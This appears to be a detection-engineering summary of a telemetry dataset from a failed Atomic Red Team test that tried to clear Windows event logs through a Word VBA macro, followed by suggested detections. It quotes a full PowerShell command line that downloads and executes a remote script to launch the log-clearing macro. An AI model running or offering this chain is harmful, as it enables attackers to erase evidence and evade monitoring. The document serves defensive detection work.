# T1070.001-3: Clear Windows Event Logs — Clear Event Logs via VBA

## Technique Context

T1070.001 Clear Windows Event Logs is a defense evasion technique where adversaries attempt to clear Windows event logs to hide their activities and evade detection. This technique is commonly used post-compromise to remove evidence of lateral movement, persistence mechanisms, credential access, and other malicious activities. 

The VBA variant specifically involves using Visual Basic for Applications (VBA) macros to programmatically clear event logs through COM objects or Windows APIs. This approach is particularly insidious because it can be embedded in seemingly legitimate Office documents and executed when users enable macros. Detection engineers typically focus on monitoring for event log clearing APIs (like ClearEventLog), unusual Office application behavior, VBA execution patterns, and the conspicuous absence of expected log entries following suspicious activity.

## What This Dataset Contains

This dataset captures an attempted execution of event log clearing via VBA that ultimately fails due to missing Office installation. The PowerShell telemetry shows the complete attack chain:

- Security 4688 events capture the PowerShell process creation with the full command line: `"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) Invoke-Maldoc -macroFile \"C:\AtomicRedTeam\atomics\T1070.001\src\T1070.001-macrocode.txt\" -officeProduct \"Word\" -sub \"ClearLogs\"}`
- PowerShell 4104 script block logging captures the complete `Invoke-MalDoc` function definition, showing how it creates COM objects for Office applications and executes VBA macros
- PowerShell 4100 error event shows the technique failure: `Retrieving the COM class factory for component with CLSID {00000000-0000-0000-0000-000000000000} failed due to the following error: 80040154 Class not registered (Exception from HRESULT: 0x80040154 (REGDB_E_CLASSNOTREG))`
- Sysmon 22 DNS query for `raw.githubusercontent.com` shows the initial payload download
- Sysmon 1 process creation events for both PowerShell instances and the `whoami.exe` reconnaissance command

The telemetry clearly shows the attempt to instantiate a Word COM object (`New-Object -ComObject "Word.Application"`) and the subsequent failure when Office is not installed on the system.

## What This Dataset Does Not Contain

This dataset does not contain evidence of successful event log clearing because Microsoft Office is not installed on the test system. The technique fails at the COM object instantiation stage, so there are no:

- Registry modifications to enable VBA object model access (`AccessVBOM` registry key)
- Actual Office application process creation (winword.exe, excel.exe)
- VBA macro execution telemetry
- Event log clearing API calls (ClearEventLog, EvtClearLog)
- Windows Event Log service interactions
- Cleared event logs or log clearing security events

The missing Office installation means the attack vector cannot proceed beyond the initial COM object creation failure, limiting the defensive value for detecting successful log clearing operations.

## Assessment

This dataset provides limited utility for detection engineering of successful T1070.001 implementations via VBA. While it captures excellent telemetry of the attack attempt and preparation phase, the early failure due to missing Office components means it lacks the critical indicators that would appear during actual event log clearing.

The dataset is valuable for detecting the delivery and initial execution phases of VBA-based attacks, particularly the PowerShell-driven Office COM automation pattern. However, for building detections around the core technique (actual log clearing), analysts would need supplementary data showing successful execution on systems with Office installed.

The comprehensive PowerShell logging and the clear error conditions make this dataset useful for understanding attack methodology and building preventive controls, but less useful for post-compromise detection of successful log clearing.

## Detection Opportunities Present in This Data

1. **PowerShell COM Object Instantiation Failures** - Monitor PowerShell 4100 error events containing "Class not registered" with CLSID patterns, particularly when combined with Office application names in command lines

2. **Suspicious Office COM Automation Commands** - Detect PowerShell script blocks containing `New-Object -ComObject` with Office applications ("Word.Application", "Excel.Application") especially when combined with VBA-related methods

3. **Invoke-MalDoc Function Usage** - Alert on PowerShell 4104 events containing the `Invoke-MalDoc` function definition or calls with parameters like `-macroFile`, `-officeProduct`, and `-sub`

4. **Registry AccessVBOM Modification Patterns** - Watch for PowerShell commands attempting to set `AccessVBOM` registry values in Office security paths, even when they fail

5. **Atomic Red Team Macro File Access** - Monitor for file access to paths matching `/atomics/T1070.001/src/` or files ending in `-macrocode.txt`

6. **Suspicious Network Download and Execution Chain** - Correlate DNS queries to raw.githubusercontent.com followed by PowerShell execution of downloaded content containing Office automation code

7. **PowerShell Process Spawning with Office Automation** - Detect Security 4688 events where PowerShell command lines contain both network download functions (IEX, iwr) and Office COM object references
